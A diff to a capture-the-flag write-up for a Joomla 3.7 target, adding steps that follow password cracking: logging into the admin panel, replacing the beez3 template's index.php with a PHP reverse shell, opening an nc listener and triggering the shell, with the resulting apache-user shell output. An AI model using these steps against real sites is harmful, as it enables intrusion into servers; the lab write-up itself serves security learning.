@@ -71,6 +71,8 @@ I reckoned that I should check all the path that came with status `200` manually
 ## Accessing  `/htaccess.txt`
 ![Image](https://github.com/user-attachments/assets/e2820de9-5869-4c82-9f2e-88302f68d2b5)
 Nothing special but I knew that the version of Joomla is 3.7.x for the target, then I assumed that the version is 3.7.0-9 about that range
+Therefore, I tried `/administrator/` path which leaded me to this site
+![Image](https://github.com/user-attachments/assets/d228287f-07ca-4189-a813-eb51ed7d2a9d)
 Then I tried to find some credentials to login
 and saw this hint:
 ![Image](https://github.com/user-attachments/assets/f2acf5a4-ac19-456d-9716-dd7c8a29b0d0)
@@ -101,6 +103,28 @@ john password.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
 ```
 and I found the password, by the way, I got the username too, therefore, I attempted to login.
 ![Image](https://github.com/user-attachments/assets/85c69d85-5e4c-4ca6-911b-010fed173ee8)
+![Image](https://github.com/user-attachments/assets/c8290d57-500d-49ad-b537-b5ee8d8a9235)
+![Image](https://github.com/user-attachments/assets/75d04eed-e4a1-47a7-83f1-b45c2dcd10db)
 # Boom, Login Successfully~~!!! 
+Then access to this path, replace `index.php` of `beez3` with the [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell)
+![Image](https://github.com/user-attachments/assets/f258c8e7-bc96-43fc-b34c-10e1eeecf88d)
+Remeber to set up a listener ( my case is port 1234) first
+```note
+nc -lvnp 1234
+```
+Then accessing the template `beez3` index.php to trigger the reverse-shell
+```note
+http://{ip}/templates/beez3/index.php
+```
+```python
+listening on [any] 1234 ...
+connect to [10.23.99.113] from (UNKNOWN) [10.10.5.71] 45380
+Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 07:05:37 up 49 min,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+sh-4.2$ 
+```
 
 
